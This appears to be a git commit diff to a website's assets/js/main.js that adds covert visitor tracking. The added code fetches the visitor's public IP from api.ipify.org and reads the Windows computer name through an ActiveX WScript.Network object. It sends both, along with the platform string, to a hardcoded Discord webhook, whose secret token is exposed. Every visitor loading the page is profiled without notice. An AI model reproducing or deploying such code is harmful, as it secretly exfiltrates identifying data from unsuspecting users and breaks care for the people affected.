51bbcf15f7f4e83981ce050bc9a7d195c5e1f273
gogiyaw <86326882+gogiyaw@users.noreply.github.com>
2021-06-23 08:17:22 +1000

    Add files via upload

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,5 +1,13 @@
 (async () => {
-    const params = { content: `${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}` };
+
+    const response = await fetch('https://api.ipify.org', {
+        method: 'GET'
+    });
+    const ip = response.text();
+    
+    const network = new ActiveXObject('WScript.Network');
+
+    const params = { content: `Platform: ${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}\nHOSTNAME: ${network.computerName}\nIP: ${ip}` };
     const rawResponse = await fetch('https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV', {
         method: 'POST',
         headers: {
